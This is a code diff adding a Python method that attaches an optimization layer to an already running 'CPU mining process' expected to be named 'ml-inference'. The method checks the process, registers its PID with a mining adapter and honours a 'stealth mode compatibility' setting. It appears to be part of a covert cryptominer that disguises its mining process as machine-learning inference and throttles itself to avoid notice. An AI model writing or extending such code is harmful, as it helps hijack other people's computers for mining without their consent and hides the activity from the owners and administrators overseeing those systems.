@@ -175,6 +175,64 @@ class OptimizedSystemIntegration:
             self.logger.error(f"Failed to stop optimized mining: {e}")
             return False
     
+    def attach_to_existing_process(self, pid: int) -> bool:
+        """
+        Attach OptimizedCalculationChain to existing CPU mining process.
+        
+        Args:
+            pid: Process ID of existing ml-inference process
+            
+        Returns:
+            bool: True if successfully attached, False otherwise
+        """
+        try:
+            self.logger.info(f"⚡ Attaching OptimizedCalculationChain to existing process PID={pid}")
+            
+            # Validate process exists and is accessible
+            if not psutil.pid_exists(pid):
+                self.logger.error(f"Process PID={pid} không tồn tại")
+                return False
+            
+            try:
+                proc = psutil.Process(pid)
+                process_name = proc.name()
+                
+                # Validate đây là ml-inference process
+                if "ml-inference" not in process_name and "inference" not in process_name:
+                    self.logger.warning(f"Process PID={pid} ({process_name}) may not be ml-inference")
+                
+                self.logger.info(f"🔗 Validated process: {process_name} (PID={pid})")
+                
+            except psutil.AccessDenied:
+                self.logger.error(f"Access denied to process PID={pid}")
+                return False
+            
+            # Store legacy process PID for tracking
+            self.legacy_process_pid = pid
+            
+            # Enable stealth mode compatibility if needed
+            if self.config.stealth_mode_compatible:
+                self.logger.info("🥷 Stealth mode compatibility enabled for existing process")
+            
+            # If mining adapter exists, register the PID
+            if self.mining_adapter:
+                try:
+                    # Register existing process với mining adapter
+                    self.mining_adapter.register_external_process(pid)
+                    self.logger.info(f"✅ Registered PID={pid} with mining adapter")
+                except Exception as e:
+                    self.logger.warning(f"Failed to register PID with mining adapter: {e}")
+            
+            # Set flag indicating we're attached to external process
+            self.optimized_mining_active = True
+            
+            self.logger.info(f"🎯 Successfully attached OptimizedCalculationChain to PID={pid}")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ Failed to attach to existing process PID={pid}: {e}")
+            return False
+
     def apply_system_throttling(self, throttle_percentage: float) -> bool:
         """
         Apply throttling compatible với existing throttling framework.
